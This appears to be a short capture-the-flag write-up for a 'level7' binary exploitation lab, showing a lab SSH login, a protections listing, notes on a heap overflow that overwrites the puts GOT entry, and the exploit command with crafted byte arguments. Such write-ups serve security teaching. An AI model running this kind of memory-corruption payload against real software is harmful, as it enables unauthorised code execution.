# level7

## Header

```bash
ssh level7@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```

<hr>

## Solution


<!-- [scheme](./Resources/scheme07.png) -->


0x8049928 - puts@got.plt

0x80484f4 - addr of m function

res of 2nd malloc written to the res of 1st + 4 (arr1 + 4)

<img src="./Resources/scheme07.png" width=400/>

```bash
./level7 $'XXXXXXXXXXXXXXXXXXXX\x28\x99\x04\x08' $'\xf4\x84\x04\x08'
```

## References
